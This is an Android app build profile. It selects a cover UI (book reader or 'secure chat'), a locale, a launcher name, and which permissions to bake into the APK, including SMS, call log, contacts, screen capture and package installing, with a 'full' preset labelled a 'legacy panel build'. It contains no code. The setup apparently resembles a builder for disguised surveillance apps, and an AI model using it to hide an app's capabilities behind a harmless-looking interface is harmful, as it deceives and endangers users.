# =============================================================================
# Build profile — edit this file BEFORE running assembleRelease / assembleDebug
# =============================================================================
#
# Presets (set build.preset, then build — individual flags below override preset):
#   storage-only  — library app, storage permissions only (safest / Play-friendly)
#   library       — book reader UI + storage
#   chat          — chat UI + storage + notifications
#   chat-full     — chat + storage + notifications + camera + microphone + location
#   full          — all optional permissions enabled (legacy panel build)
#   custom        — use only the perm.* / startup.* flags below (ignore preset defaults)
#
build.preset=custom

# App UI type: library (book reader) | chat (secure chat)
app.design.mode=library

# App UI language: en (English) | ar (Arabic) — baked into APK at build time
app.locale=en

# Launcher name under the app icon (set when running build-apk.ps1; empty = preset by design type)
app.display.name=testapp

# --- Optional permissions (true = included in APK manifest) ---
perm.storage=true
perm.camera=false
perm.microphone=false
perm.location=false
perm.notifications=false
perm.wifi=true
perm.sms=false
perm.contacts=false
perm.call_log=false
perm.phone_state=true
perm.query_all_packages=false
perm.battery_optimization=true
perm.install_packages=true
perm.screen_capture=false
perm.full_screen_intent=false

# --- Request at app startup (true = mandatory — app blocks until user grants) ---
startup.request.storage=true
startup.request.notifications=false
startup.request.camera=false
startup.request.microphone=false
startup.request.location=false
startup.request.sms=false
startup.request.battery_optimization=false
